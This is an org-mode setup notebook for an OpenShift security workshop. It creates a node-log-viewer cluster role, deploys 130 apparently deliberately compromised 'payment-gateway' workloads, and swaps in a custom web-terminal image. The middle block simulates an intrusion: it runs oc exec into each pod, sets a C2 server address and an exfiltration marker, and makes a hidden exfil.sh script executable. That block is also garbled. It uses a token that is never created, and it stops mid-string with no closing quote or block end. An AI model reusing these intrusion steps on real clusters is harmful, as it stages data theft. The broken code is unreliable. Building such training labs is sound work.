* Create a cluster role for viewing node logs

During the workshop participants are going to query node logs with ~oc adm~.  We need to create a cluster role that will allow this.

#+NAME: Create node log view cluster role
#+begin_src bash
cat << EOF | oc apply --filename -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: node-log-viewer
rules:
  - apiGroups: [""]
    resources:
      - "nodes/log"
      - "nodes/proxy"
      - "nodes"
    verbs: ["get", "list", "create"]
  - apiGroups: ["config.openshift.io"]
    resources:
      - clusterversions
      - clusteroperators
      - apiservers
    verbs: ["get", "list"]
EOF
#+end_src

* Deploy exercise 2 & 3 compromised workloads

For the purposes of exercise 2 we need an existing project and demo workload for each workshop user.

We'll create the required ~Project~, ~Pod~ and ~ServiceAccount~ by hydrating an OpenShift ~Template~, then carry out the exploit with a bash script once the pods are up.

The ~setup/app-template.yaml~ file also handles the various permissions each workshop attendee requires.

#+NAME: Deploy compromised workloads
#+begin_src bash :results none
echo "Applying template for each attendee"
for i in $(seq 1 130); do

  # Clean up any pre-existing exploited pod
  oc delete deploy -l app=payment-gateway --namespace="payment-gateway-${i}" 2>/dev/null || true
  oc wait --for=delete deploy -l app=payment-gateway --namespace="payment-gateway-${i}" --timeout=30s 2>/dev/null || true

  # Hydrate the new pod and supporting resources
  oc process --filename setup/app-template.yaml --param SUFFIX=$i | oc apply --filename -
done

echo "Waiting for all payment-gateway pods to initialize..."
oc wait --for=condition=Ready pods --selector app=payment-gateway --all-namespaces --timeout=90s

echo "Simulating live 'oc exec' intrusion across environments..."
for i in $(seq 1 130); do
  namespace="payment-gateway-$i"

  # Request a short lived token for our new cicd service account in this namespace

  # Executing the exploit payload dynamically using explicit parameter names
  oc exec deploy/payment-gateway \
    --namespace "${namespace}" \
    --token "${token}" \
    --container httpd \
    -- sh -c '
      export C2_SERVER="185.199.108.153"
      export CODENAME="SHADOW_PIVOT"
      export ENV_MARKER="ACME_SECRET_KEY_EXFIL_TEST_9921"

      chmod +x /tmp/.hidden_toolkit/exfil.sh

* Customize default web terminal image

We are going to customize the web terminal that participants will use in order to make the lab more deterministic and responsive. Specifically the exercise for querying cluster audit logs on master nodes, which has issues due to short log retention times and placing high load on masters.

We can simply patch the default Web Terminal ~DevWorkspaceTemplate~ to use our custom image which includes a shim for the ~oc adm node-logs~ commands we use to return a deterministic cached response to make the workshop more reliable.

#+NAME: Customize web terminal operator
#+begin_src bash
cat << EOF | oc apply --filename -
apiVersion: workspace.devfile.io/v1alpha2
kind: DevWorkspaceTemplate
metadata:
  annotations:
    web-terminal.redhat.com/unmanaged-state: 'true'
  name: web-terminal-tooling
  namespace: openshift-operators
spec:
  components:
  - name: web-terminal-tooling
    container:
      args:
        - tail
        - -f
        - /dev/null
      cpuLimit: 400m
      cpuRequest: 100m
      image: quay.io/rh_ee_jablair/web-terminal/web-terminal-tooling-rhel9-shim:latest
      memoryLimit: 4Gi
      memoryRequest: 512Mi
      mountSources: false
      sourceMapping: /projects
EOF
#+end_src

#+begin_example
devworkspacetemplate.workspace.devfile.io/web-terminal-tooling configured
#+end_example
